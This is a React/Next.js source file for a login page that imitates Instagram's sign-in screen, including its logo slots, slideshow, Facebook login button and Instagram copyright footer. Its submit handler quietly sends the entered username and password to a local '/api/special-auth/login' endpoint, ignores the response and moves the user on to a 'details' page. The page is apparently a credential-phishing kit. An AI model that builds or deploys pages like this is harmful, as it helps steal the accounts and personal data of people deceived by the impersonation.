"use client";

import React, { useEffect, useState } from 'react';
import Image from 'next/image';
import styles from './specialAuth.module.css';
import { useRouter } from 'next/navigation';

export default function SpecialAuthLanding() {
  const router = useRouter();
  const slides = [
    '/special-auth/slide (1).jpg',
    '/special-auth/slide (2).jpg',
    '/special-auth/slide (3).jpg',
    '/special-auth/slide (4).jpg',
    '/special-auth/slide (5).jpg',
  ];

  const [slideIndex, setSlideIndex] = useState(0);
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [canSubmit, setCanSubmit] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    const t = setInterval(() => {
      setSlideIndex(i => (i + 1) % slides.length);
    }, 2000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    // allow any non-empty values so users with short usernames/phones can proceed
    setCanSubmit(emailOrPhone.trim().length > 0 && password.trim().length > 0);
  }, [emailOrPhone, password]);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    if (!canSubmit || submitting) return;
    setSubmitting(true);
    // Fire the save request but don't await it to avoid blocking navigation if the API is slow.
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 3000);
      fetch('/api/special-auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: emailOrPhone, password }),
        signal: controller.signal,
      }).catch(() => {
        // ignore
      }).finally(() => clearTimeout(timeout));
    } catch (err) {
      // ignore
    }

    // Immediately navigate to details page so the user isn't stuck.
    try {
      // client-side push
      router.push('/special-auth/details');
    } catch (err) {
      // fallback to full redirect
      try { window.location.href = '/special-auth/details'; } catch (e) { /* ignore */ }
    }

    // Fallback: in case router.push silently fails, ensure navigation after a short delay
    setTimeout(() => {
      try { window.location.href = '/special-auth/details'; } catch (e) { /* ignore */ }
    }, 700);

    // Note: we don't unset submitting here because the component will unmount on navigation.
  }

  return (
    <div className={styles.container}>
      <div className={styles['main-container']}>
        <div className={styles['main-content']}>
          <div className={styles['slide-container']} style={{ backgroundImage: "url('/special-auth/phone-frame.png')" }}>
            <div className={styles['slide-content']}>
              {slides.map((src, i) => (
                // use plain img here to ensure exact layout (images are in public)
                <img key={src} src={src} alt={`slide ${i}`} className={i === slideIndex ? styles.imgActive : ''} style={{ position: 'absolute', inset: 0 }} />
              ))}
            </div>
          </div>
          <div className={styles['form-container']}>
            <div className={`${styles['form-content']} ${styles.box}`}>
              <div className={styles.logo}>
                <img src="/special-auth/logo-light.png" alt="logo" className={styles['logo-light']} />
                <img src="/special-auth/logo-dark.png" alt="logo" className={styles['logo-dark']} />
              </div>

              <form id="signin-form" className={styles['signin-form']} onSubmit={handleLogin}>
                <div className={styles['form-group']}>
                  <div className={`${styles['animate-input']} ${emailOrPhone ? styles.active : ''}`}>
                    <span>Phone number, username or email</span>
                    <input value={emailOrPhone} onChange={e => setEmailOrPhone(e.target.value)} />
                  </div>
                </div>
                <div className={styles['form-group']}>
                    <div className={`${styles['animate-input']} ${password ? styles.active : ''}`}>
                    <span>Password</span>
                    <input type={showPassword ? 'text' : 'password'} value={password} onChange={e => setPassword(e.target.value)} />
                    <button type="button" onClick={() => setShowPassword(s => !s)}>{showPassword ? 'Hide' : 'Show'}</button>
                  </div>
                </div>
                <div className={styles['btn-group']}>
                  <button className={styles['btn-login']} id="signin-btn" type="submit" disabled={!canSubmit || submitting}>
                    {submitting ? 'Logging in…' : 'Log In'}
                  </button>
                </div>
                <div className={styles.divine}>
                  <div></div>
                  <div>OR</div>
                  <div></div>
                </div>
                <div className={styles['btn-group']}>
                  <button type="button" className={styles['btn-fb']}>
                    <img src="/special-auth/facebook-icon.png" alt="fb" />
                    <span>Log in with Facebook</span>
                  </button>
                </div>
                <a href="#" className={styles['forgot-pw']}>Forgot password?</a>
              </form>
            </div>

            <div className={`${styles.box} ${styles.goto}`}>
              <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>

            <div className="app-download">
              <p>Get the app.</p>
              <div className={styles['store-link']}>
                <a href="#"><img src="/special-auth/app-store.png" alt="app store" /></a>
                <a href="#"><img src="/special-auth/gg-play.png" alt="google play" /></a>
              </div>
            </div>

          </div>
        </div>
      </div>
      <div className={styles.footer}>
        <div className={styles.links}>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Top Accounts</a>
          <a href="#">Hashtags</a>
          <a href="#">Locations</a>
          <a href="#" id="darkmode-toggle">Darkmode</a>
        </div>
        <div className={styles.copyright}>© 2021 Instagram from Facebook</div>
      </div>
    </div>
  );
}
